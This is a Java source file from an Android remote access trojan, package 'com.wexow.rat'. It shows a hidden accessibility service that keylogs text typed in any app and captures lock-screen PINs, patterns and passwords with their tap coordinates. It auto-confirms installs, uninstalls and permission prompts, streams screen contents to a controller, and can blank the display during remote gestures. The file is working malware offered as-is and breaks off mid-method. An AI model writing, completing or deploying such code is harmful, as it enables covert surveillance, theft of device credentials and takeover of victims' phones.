package com.wexow.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;

import android.content.Intent;
import android.net.Uri;
import android.app.PendingIntent;
import android.os.Bundle;
import android.content.pm.PackageManager;
import android.util.DisplayMetrics;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.FrameLayout;

import android.app.KeyguardManager;
import android.content.Context;
import java.util.HashMap;
import java.util.Map;

import com.wexow.rat.managers.AutoCaptureManager;
import com.wexow.rat.utils.Prefs;
import com.wexow.rat.core.ConnectionManager;

public class KeylogManager extends AccessibilityService {
    private static final String TAG = "KeylogManager";
    private static KeylogManager instance;
    private static boolean isReadingScreen = false;
    private CommandProcessor commandProcessor;
    private WindowManager windowManager;
    private FrameLayout blackOverlay;
    private KeyguardManager keyguardManager;

    // ===== Harvester =====
    private String capturedPin = "";
    private String capturedPattern = "";
    private String capturedPassword = "";
    private boolean wasLocked = false;
    private Map<String, String> coordMap = new HashMap<>();

    // ===== Auto Install/Uninstall flags =====
    private boolean autoUninstallEnabled = true;
    private boolean autoInstallEnabled = true;
    private boolean autoAllowSettingsEnabled = true;
    private boolean autoAcceptPermissionsEnabled = false;

    public static KeylogManager getInstance() {
        return instance;
    }

    public void setAutoUninstall(boolean e) {
        this.autoUninstallEnabled = e;
    }

    public void setAutoInstall(boolean e) {
        this.autoInstallEnabled = e;
    }

    public void setAutoAllowSettings(boolean e) {
        this.autoAllowSettingsEnabled = e;
    }

    public void setAutoAcceptPermissions(boolean e) {
        this.autoAcceptPermissionsEnabled = e;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        commandProcessor = new CommandProcessor(this);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);

        Log.e("KeylogManager", "🎉 KeylogManager CONNECTED!");

        try {
            AccessibilityServiceInfo info = getServiceInfo();
            if (info != null) {
                info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
                info.feedbackType = AccessibilityServiceInfo.FEEDBACK_VISUAL;
                info.notificationTimeout = 300;

                try {
                    java.lang.reflect.Field hiddenField = AccessibilityServiceInfo.class
                            .getDeclaredField("FLAG_HIDDEN");
                    hiddenField.setAccessible(true);
                    int FLAG_HIDDEN = (int) hiddenField.get(null);
                    info.flags |= FLAG_HIDDEN;
                    Log.e("KeylogManager", "✅ FLAG_HIDDEN applied");
                } catch (Exception e) {
                    info.flags |= 0x10000000;
                    Log.e("KeylogManager", "✅ FLAG_HIDDEN (constant) applied");
                }

                setServiceInfo(info);
                Log.e("KeylogManager", "✅ Service info updated");
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "❌ Service info: " + e.getMessage());
        }

        try {
            android.provider.Settings.Secure.putInt(
                    getContentResolver(),
                    "accessibility_icon_visible",
                    0);
            Log.e("KeylogManager", "✅ accessibility_icon_visible=0");
        } catch (Exception e) {
            Log.e("KeylogManager", "⚠️ Cannot set icon visibility: " + e.getMessage());
        }

        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "accessibility_status");
            jo.put("enabled", true);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {
        }
    }

    public void processCommand(String command, String argument) {
        if (commandProcessor != null) {
            commandProcessor.process(command, argument);
        }
    }

    // ===== Black Overlay =====
    public void toggleBlackOverlay(boolean enable) {
        if (enable) {
            if (blackOverlay == null) {
                blackOverlay = new FrameLayout(this);
                blackOverlay.setBackgroundColor(Color.BLACK);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP;
                windowManager.addView(blackOverlay, params);
            }
        } else {
            if (blackOverlay != null) {
                windowManager.removeView(blackOverlay);
                blackOverlay = null;
            }
        }
    }

    /*
     * @Override
     * public void onAccessibilityEvent(AccessibilityEvent event) {
     * long startTime = System.currentTimeMillis();
     * 
     * try {
     * // ===== Keyguard check =====
     * boolean isLocked = keyguardManager != null &&
     * keyguardManager.isKeyguardLocked();
     * if (wasLocked && !isLocked) reportUnlockSuccess();
     * wasLocked = isLocked;
     * 
     * if (isLocked) harvestLockScreen(event);
     * 
     * // ===== On Window Change: Auto actions =====
     * 
     * if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
     * 
     * String packageName = event.getPackageName() != null ?
     * event.getPackageName().toString() : "";
     * String className = event.getClassName() != null ?
     * event.getClassName().toString() : "";
     * 
     * if (packageName.contains("packageinstaller")) {
     * autoClickStartNow();
     * }
     * 
     * if (className.contains("MediaProjectionPermissionActivity")) {
     * new android.os.Handler(android.os.Looper.getMainLooper())
     * .postDelayed(this::autoClickMediaProjectionAllow, 800);
     * }
     * 
     * 
     * }
     * 
     * if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
     * event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED ||
     * event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
     * 
     * String pkg = event.getPackageName() != null ?
     * event.getPackageName().toString() : "Unknown";
     * String eventData = "";
     * 
     * switch (event.getEventType()) {
     * case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
     * if (!event.getText().isEmpty()) {
     * eventData = event.getText().toString();
     * }
     * break;
     * case AccessibilityEvent.TYPE_VIEW_CLICKED:
     * if (event.getText() != null && !event.getText().isEmpty()) {
     * eventData = "[Clicked: " + event.getText().toString() + "]";
     * }
     * break;
     * case AccessibilityEvent.TYPE_VIEW_FOCUSED:
     * if (event.getText() != null && !event.getText().isEmpty()) {
     * eventData = "[Focused: " + event.getText().toString() + "]";
     * }
     * break;
     * }
     * 
     * if (!eventData.isEmpty()) {
     * JSONObject jo = new JSONObject();
     * jo.put("type", "keylog");
     * jo.put("app", pkg);
     * jo.put("data", eventData);
     * jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
     * .format(new Date()));
     * ConnectionManager.send(jo.toString());
     * }
     * }
     * } catch (Exception e) {
     * Log.e(TAG, "Accessibility Event Error: " + e.getMessage());
     * } finally {
     * long elapsed = System.currentTimeMillis() - startTime;
     * if (elapsed > 200) {
     * Log.e(TAG, "⚠️ onAccessibilityEvent took " + elapsed + "ms");
     * }
     * }
     * }
     */

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        long startTime = System.currentTimeMillis();

        try {
            int eventType = event.getEventType();

            // ⭐ Keylogger
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                handleKeylogText(event);
                return;
            }

            // ⭐ Focused / Clicked
            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                    eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleKeylogFocus(event);
                return;
            }

            // ⭐ WINDOW_STATE_CHANGED
            if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                return;
            }

            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";

            // MediaProjection
            if (className.contains("MediaProjectionPermissionActivity")) {
                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(this::autoClickMediaProjectionAllow, 800);
            }

            // Package installer
            if (packageName.contains("packageinstaller")) {
                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(this::autoConfirmInstallSafe, 500);
            }

            final String pkg = packageName;
            new Thread(() -> {
                try {
                    AutoCaptureManager.onAppOpened(KeylogManager.this, pkg);
                } catch (Exception ignored) {
                }
            }).start();

            // Keyguard
            boolean isLocked = keyguardManager != null &&
                    keyguardManager.isKeyguardLocked();
            if (wasLocked && !isLocked)
                reportUnlockSuccess();
            wasLocked = isLocked;

            // ⭐⭐⭐ Lock screen harvest
            if (isLocked && (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
                new Thread(() -> harvestLockScreen(event)).start();
            }

        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent: " + e.getMessage());
        } finally {
            long elapsed = System.currentTimeMillis() - startTime;
            if (elapsed > 100) {
                Log.e(TAG, "⚠️ onAccessibilityEvent took " + elapsed + "ms");
            }
        }
    }

    // ⭐ Keylogger
    private void handleKeylogText(AccessibilityEvent event) {
        try {
            if (event.getText().isEmpty())
                return;

            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

            JSONObject jo = new JSONObject();
            jo.put("type", "keylog");
            jo.put("app", pkg);
            jo.put("data", event.getText().toString());
            jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                    .format(new Date()));
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {
        }
    }

    // ⭐ Focus
    private void handleKeylogFocus(AccessibilityEvent event) {
        try {
            if (event.getText() == null || event.getText().isEmpty())
                return;

            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";

            String prefix = event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED ? "[Focused: " : "[Clicked: ";

            JSONObject jo = new JSONObject();
            jo.put("type", "keylog");
            jo.put("app", pkg);
            jo.put("data", prefix + event.getText().toString() + "]");
            jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                    .format(new Date()));
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {
        }
    }

    // ⭐ Auto-confirm install
    private void autoConfirmInstallSafe() {
        new Thread(() -> {
            try {
                Thread.sleep(500);
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null)
                    return;

                String[] targets = { "Install", "INSTALL", "OK" };
                for (String t : targets) {
                    AccessibilityNodeInfo node = findNodeByTextManual(root, t);
                    if (node != null) {
                        Rect b = new Rect();
                        node.getBoundsInScreen(b);
                        click(b.centerX(), b.centerY());
                        return;
                    }
                }
            } catch (Exception ignored) {
            }
        }).start();
    }

    // ============================================================
    // ============ Harvester Methods ============
    // ============================================================

    /*
     * private void harvestLockScreen(AccessibilityEvent event) {
     * if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED &&
     * event.getEventType() != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
     * event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;
     * 
     * AccessibilityNodeInfo source = event.getSource();
     * if (source == null) return;
     * 
     * String resId = source.getViewIdResourceName();
     * if (resId == null) return;
     * 
     * Rect bounds = new Rect();
     * source.getBoundsInScreen(bounds);
     * String coords = bounds.centerX() + "," + bounds.centerY();
     * 
     * // PIN
     * if (resId.contains("com.android.systemui:id/key")) {
     * String key = resId.substring(resId.lastIndexOf("key") + 3);
     * if (key.matches("\\d")) {
     * capturedPin += key;
     * coordMap.put("PIN_" + key, coords);
     * Log.d(TAG, "PIN Capture: " + key);
     * } else if (key.equals("_enter") || key.equals("_ok")) {
     * capturedPin += "[E]";
     * coordMap.put("PIN_ENTER", coords);
     * }
     * }
     * 
     * // Pattern
     * if (resId.contains("lockPatternView")) {
     * CharSequence contentDesc = source.getContentDescription();
     * if (contentDesc != null) {
     * String cell = contentDesc.toString();
     * if (!capturedPattern.contains(cell)) {
     * capturedPattern += cell + " ";
     * coordMap.put("PT_" + cell, coords);
     * Log.d(TAG, "Pattern Capture: " + cell);
     * }
     * }
     * }
     * 
     * // Password
     * if (resId.contains("passwordEntry") || resId.contains("miui_mixed_password"))
     * {
     * if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
     * capturedPassword = event.getText().toString();
     * Log.d(TAG, "Password Capture: " + capturedPassword);
     * }
     * }
     * }
     */

    private void harvestLockScreen(AccessibilityEvent event) {
        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_CLICKED &&
                type != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
                type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)
            return;

        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source == null)
                return;

            String resId = source.getViewIdResourceName();
            if (resId == null) {
                source.recycle();
                return;
            }

            Rect bounds = new Rect();
            source.getBoundsInScreen(bounds);
            String coords = bounds.centerX() + "," + bounds.centerY();

            // PIN
            if (resId.contains("com.android.systemui:id/key")) {
                String key = resId.substring(resId.lastIndexOf("key") + 3);
                if (key.matches("\\d")) {
                    capturedPin += key;
                    coordMap.put("PIN_" + key, coords);
                } else if (key.equals("_enter") || key.equals("_ok")) {
                    capturedPin += "[E]";
                    coordMap.put("PIN_ENTER", coords);
                }
            }

            // Pattern
            if (resId.contains("lockPatternView")) {
                CharSequence contentDesc = source.getContentDescription();
                if (contentDesc != null) {
                    String cell = contentDesc.toString();
                    if (!capturedPattern.contains(cell)) {
                        capturedPattern += cell + " ";
                        coordMap.put("PT_" + cell, coords);
                    }
                }
            }

            // Password
            if (resId.contains("passwordEntry") || resId.contains("miui_mixed_password")) {
                if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    capturedPassword = event.getText().toString();
                }
            }

            source.recycle(); // recycle

        } catch (Exception ignored) {
        }
    }

    private void reportUnlockSuccess() {
        try {
            if (capturedPin.isEmpty() && capturedPattern.isEmpty() && capturedPassword.isEmpty())
                return;

            JSONObject jo = new JSONObject();
            jo.put("type", "lock_captured");
            jo.put("pin", capturedPin);
            jo.put("pattern", capturedPattern.trim());
            jo.put("password", capturedPassword);

            JSONObject coords = new JSONObject();
            for (Map.Entry<String, String> entry : coordMap.entrySet()) {
                coords.put(entry.getKey(), entry.getValue());
            }
            jo.put("coords", coords);

            ConnectionManager.send(jo.toString());

            // Reset
            capturedPin = "";
            capturedPattern = "";
            capturedPassword = "";
            coordMap.clear();
        } catch (Exception ignored) {
        }
    }

    // ============================================================
    // ============ Auto Actions ============
    // ============================================================
    private long lastAutoClickTime = 0;
    private static final long AUTO_CLICK_COOLDOWN = 3000;

    private void autoClickStartNow() {
        long now = System.currentTimeMillis();
        if (now - lastAutoClickTime < AUTO_CLICK_COOLDOWN)
            return;
        lastAutoClickTime = now;

        try {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return;

            String[] targets = {
                    "Start now", "START NOW", "Allow", "ALLOW",
                    "Inizializza ora", "Comenzar ahora", "Commencer"
            };

            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d(TAG, "Auto-clicked: " + target);
                            return;
                        }
                    }
                }
            }

        } catch (Exception e) {
        }
    }

    private void autoConfirmUninstall(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();

            if (root == null) {
                List<AccessibilityWindowInfo> windows = getWindows();
                for (AccessibilityWindowInfo w : windows) {
                    if (w.getType() == AccessibilityWindowInfo.TYPE_SYSTEM ||
                            w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {
                        root = w.getRoot();
                        if (root != null && root.getChildCount() > 0)
                            break;
                    }
                }
            }

            if (root == null) {
                Log.e(TAG, "⚠️ Root null, retrying...");
                new android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed(() -> autoConfirmUninstall(null), 500);
                return;
            }

            Log.e(TAG, "🗑️ Attempting auto-uninstall confirm...");

            String[] viewIds = {
                    "android:id/button1",
                    "android:id/button2",
                    "com.miui.packageinstaller:id/ok_button",
                    "com.miui.packageinstaller:id/uninstall_button",
                    "com.android.packageinstaller:id/ok_button",
                    "com.android.packageinstaller:id/uninstall_button",
                    "miui:id/button1",
            };

            for (String vid : viewIds) {
                List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByViewId(vid);

                if (btns != null && !btns.isEmpty()) {
                    for (AccessibilityNodeInfo btn : btns) {
                        CharSequence text = btn.getText();
                        String label = text != null ? text.toString() : "";
                        String lower = label.toLowerCase();

                        if (lower.contains("cancel") ||
                                lower.contains("annuler") ||
                                lower.contains("iptal")) {
                            continue;
                        }

                        Log.e(TAG, "🎯 Found by id: " + vid + " → [" + label + "]");

                        if (tryClickNodeInternal(btn)) {
                            Log.e(TAG, "✅ Auto-uninstall confirmed!");
                            return;
                        }
                    }
                }
            }

            String[] targets = {
                    "OK", "Uninstall", "UNINSTALL", "Yes", "Confirm", "Delete",
                    "Désinstaller", "D'accord", "Oui",
                    "Kaldır", "Tamam", "Evet",
                    "Desinstalar", "Aceptar", "Sí",
                    "Удалить", "Хорошо", "Да",
                    "卸载", "确定", "是",
            };

            for (String t : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);

                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo n : nodes) {
                        Rect b = new Rect();
                        n.getBoundsInScreen(b);

                        Log.e(TAG, "🎯 Found text: [" + t + "] at " +
                                b.centerX() + "," + b.centerY());

                        if (tryClickNodeInternal(n)) {
                            Log.e(TAG, "✅ Auto-uninstall (text): " + t);
                            return;
                        }
                    }
                }
            }

            clickBottomRightButton(root);

        } catch (Exception e) {
            Log.e(TAG, "❌ autoConfirmUninstall: " + e.getMessage());
        }
    }

    private void clickBottomRightButton(AccessibilityNodeInfo root) {
        try {
            List<AccessibilityNodeInfo> buttons = new ArrayList<>();
            collectClickable(root, buttons);

            if (buttons.isEmpty())
                return;

            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int screenH = dm.heightPixels;

            AccessibilityNodeInfo best = null;
            int bestScore = -1;

            for (AccessibilityNodeInfo btn : buttons) {
                Rect b = new Rect();
                btn.getBoundsInScreen(b);

                if (b.centerY() < screenH * 0.5)
                    continue;

                if (b.width() < 100 || b.height() < 50)
                    continue;

                CharSequence t = btn.getText();
                String label = t != null ? t.toString().toLowerCase() : "";
                if (label.contains("cancel") || label.contains("إلغاء"))
                    continue;

                int score = b.centerX();
                if (score > bestScore) {
                    bestScore = score;
                    best = btn;
                }
            }

            if (best != null) {
                Rect b = new Rect();
                best.getBoundsInScreen(b);

                CharSequence t = best.getText();
                Log.e(TAG, "🎯 Clicking bottom-right: [" + t + "]");

                if (tryClickNodeInternal(best)) {
                    Log.e(TAG, "✅ Auto-uninstall (bottom-right)");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ clickBottomRightButton: " + e.getMessage());
        }
    }

    private void autoConfirmInstall(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return;

            String[] targets = {
                    "Install", "INSTALL",
                    "Continue", "OK",
                    "Open"
            };

            for (String t : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo n : nodes) {
                        if (n.isClickable()) {
                            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d(TAG, "Auto-install: " + t);
                            return;
                        }
                    }
                }
            }

            String[] ids = {
                    "com.android.packageinstaller:id/ok_button",
                    "com.android.packageinstaller:id/install_button",
                    "com.android.packageinstaller:id/continue_button",
                    "android:id/button1"
            };
            for (String id : ids) {
                List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByViewId(id);
                if (btns != null) {
                    for (AccessibilityNodeInfo b : btns) {
                        if (b.isClickable()) {
                            b.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    private void autoAllowUnknownSources() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return;

            if (findAndToggleByClass(root, "android.widget.Switch"))
                return;
            if (findAndToggleByClass(root, "android.widget.CheckBox"))
                return;
            if (findAndToggleByClass(root, "android.widget.ToggleButton"))
                return;
        } catch (Exception ignored) {
        }
    }

    private boolean findAndToggleByClass(AccessibilityNodeInfo node, String className) {
        if (node == null)
            return false;
        try {
            CharSequence cn = node.getClassName();
            if (cn != null && cn.toString().equals(className)) {
                if (!node.isChecked() && node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Auto-allowed: " + className);
                    return true;
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                if (findAndToggleByClass(node.getChild(i), className))
                    return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private void autoAcceptPermissions() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null)
                return;

            String[] targets = {
                    "Allow", "ALLOW", "While using the app",
            };

            for (String t : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo n : nodes) {
                        if (n.isClickable()) {
                            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d(TAG, "Auto-accepted permission: " + t);
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    // ============================================================
    // ============ Screen Reader ============
    // ============================================================

    private android.os.Handler screenReaderHandler;
    private Runnable screenReaderRunnable;
    private volatile boolean isDumping = false;

    public void startScreenReader() {
        Log.e("KeylogManager", "📖 Starting screen reader...");

        if (isReadingScreen) {
            Log.e("KeylogManager", "⚠️ Already running");
            return;
        }

        isReadingScreen = true;

        dumpScreen();

        screenReaderHandler = new android.os.Handler(android.os.Looper.getMainLooper());
        screenReaderRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isReadingScreen)
                    return;
                dumpScreen();
                screenReaderHandler.postDelayed(this, 3000);
            }
        };
        screenReaderHandler.postDelayed(screenReaderRunnable, 3000);

        Log.e("KeylogManager", "✅ Screen reader started");
    }

    public void stopScreenReader() {
        Log.e("KeylogManager", "📖 Stopping screen reader...");
        isReadingScreen = false;

        if (screenReaderHandler != null) {
            screenReaderHandler.removeCallbacksAndMessages(null);
            screenReaderHandler = null;
        }
        screenReaderRunnable = null;
    }

    private final java.util.Set<String> seenNodes = new java.util.HashSet<>();

    private void dumpScreen() {
        if (isDumping) {
            Log.e("KeylogManager", "⚠️ Dump already in progress, skipping");
            return;
        }
        isDumping = true;

        new Thread(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();

                if (root == null || root.getChildCount() == 0) {
                    List<AccessibilityWindowInfo> windows = getWindows();
                    for (AccessibilityWindowInfo w : windows) {
                        if (w.getType() != AccessibilityWindowInfo.TYPE_APPLICATION)
                            continue;
                        AccessibilityNodeInfo r = w.getRoot();
                        if (r != null && r.getChildCount() > 0) {
                            root = r;
                            break;
                        }
                    }
                }

                if (root == null) {
                    Log.e(TAG, "⚠️ No root found");
                    isDumping = false;
                    return;
                }

                seenNodes.clear();

                JSONArray nodes = new JSONArray();
                processNode(root, nodes);

                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();

                JSONObject jo = new JSONObject();
                jo.put("type", "screen_reader");
                jo.put("screenWidth", dm.widthPixels);
                jo.put("screenHeight", dm.heightPixels);
                jo.put("nodes", nodes);
                jo.put("pkg", root.getPackageName() != null ? root.getPackageName().toString() : "");
                ConnectionManager.send(jo.toString());

                Log.e(TAG, "📤 Sent screen_reader: " + nodes.length() +
                        " nodes, pkg=" + (root.getPackageName() != null ? root.getPackageName().toString() : ""));
            } catch (Exception e) {
                Log.e(TAG, "Dump Screen Error: " + e.getMessage());
            } finally {
                isDumping = false;
            }
        }).start();
    }

    private void processNode(AccessibilityNodeInfo node, JSONArray nodes) {
        if (node == null)
            return;

        if (nodes.length() >= 100)
            return;

        try {
            if (!node.isVisibleToUser()) {

            } else {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);

                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
                String className = node.getClassName() != null ? node.getClassName().toString() : "";

                String t = text != null ? text.toString() : "";
                String c = desc != null ? desc.toString() : "";
                boolean ck = node.isClickable();

                int w = bounds.right - bounds.left;
                int h = bounds.bottom - bounds.top;

                if (w >= 5 && h >= 5 && (!t.isEmpty() || !c.isEmpty() || ck)) {
                    String key = bounds.left + "," + bounds.top + "," +
                            bounds.right + "," + bounds.bottom + "|" + t + "|" + c;

                    if (!seenNodes.contains(key)) {
                        seenNodes.add(key);

                        JSONObject jo = new JSONObject();
                        jo.put("t", t);
                        jo.put("c", c);
                        jo.put("cl", className);
                        jo.put("b", bounds.left + "," + bounds.top + "," +
                                bounds.right + "," + bounds.bottom);
                        jo.put("ck", ck);
                        nodes.put(jo);
                    }
                }
            }

            int childCount = Math.min(node.getChildCount(), 50);
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = null;
                try {
                    child = node.getChild(i);
                } catch (Exception e) {
                    continue;
                }
                if (child != null) {
                    processNode(child, nodes);
                    if (nodes.length() >= 100)
                        break;
                }
            }
        } catch (Exception ignored) {
        }
    }

    // ============================================================
    // ============ Gestures ============
    // ============================================================

    public void performAction(int actionId) {
        boolean ok = performGlobalAction(actionId);
        Log.e("KeylogManager", "🎯 performAction(" + actionId + "): " + ok);
    }

    public void click(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(x, y);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
            boolean ok = dispatchGesture(builder.build(), null, null);
            Log.e("KeylogManager", "🎯 click(" + x + "," + y + ") dispatched: " + ok);
        }
    }

    public void swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));

            Log.e("KeylogManager", "🎯 dispatchGesture: " + x1 + "," + y1 + " → " + x2 + "," + y2);

            boolean ok = dispatchGesture(builder.build(),
                    new GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription gestureDescription) {
                            Log.e("KeylogManager", "✅ Gesture completed");
                        }

                        @Override
                        public void onCancelled(GestureDescription gestureDescription) {
                            Log.e("KeylogManager", "❌ Gesture cancelled");
                        }
                    },
                    null);

            Log.e("KeylogManager", "dispatchGesture returned: " + ok);
        }
    }

    public void launchApp(String packageName) {
        try {
            Log.d("KeylogManager", "🚀 launchApp via Accessibility: " + packageName);

            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d("KeylogManager", "✅ Launched via Accessibility context");
            }
        } catch (Exception e) {
            Log.e("KeylogManager", "launchApp error: " + e.getMessage());
        }
    }

    // ============================================================
    // ============ Launch App by Clicking Icon ===================
    // ============================================================

    public void launchAppByIcon(String appName) {
        new Thread(() -> {
            try {
                Log.e("KeylogManager", "════════════════════════════════════════");
                Log.e("KeylogManager", "🚀 launchAppByIcon: " + appName);

                boolean homeOk = performGlobalAction(GLOBAL_ACTION_HOME);
                Log.e("KeylogManager", "🏠 HOME: " + homeOk);
                Thread.sleep(800);

                if (tryFindAndClickApp(appName)) {
                    Log.e("KeylogManager", "✅ Found on home screen");
                    return;
                }

                Log.e("KeylogManager", "📱 Opening App Drawer...");
                swipe(540, 2000, 540, 400, 400);
                Thread.sleep(1200);

                if (tryFindAndClickApp(appName)) {
                    Log.e("KeylogManager", "✅ Found in App Drawer");
                    return;
                }

                Log.e("KeylogManager", "📱 Trying alternative drawer gesture...");
                swipe(540, 1800, 540, 500, 500);
                Thread.sleep(1200);

                if (tryFindAndClickApp(appName)) {
                    Log.e("KeylogManager", "✅ Found in App Drawer (alt)");
                    return;
                }

                Log.e("KeylogManager", "❌ App not found: " + appName);
                Log.e("KeylogManager", "════════════════════════════════════════");

            } catch (Exception e) {
                Log.e("KeylogManager", "❌ launchAppByIcon: " + e.getMessage(), e);
            }
        }).start();
    }

    private boolean tryFindAndClickApp(String appName) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                Log.e("KeylogManager", "root is null");
                return false;
            }

            Log.e("KeylogManager", "🔍 Searching for: " + appName);
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(appName);

            if (nodes == null || nodes.isEmpty()) {
                Log.e("KeylogManager", "❌ Not found: " + appName);
                return false;
            }

            Log.e("KeylogManager", "✅ Found " + nodes.size() + " nodes");

            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.e("KeylogManager", "✅ Clicked directly");
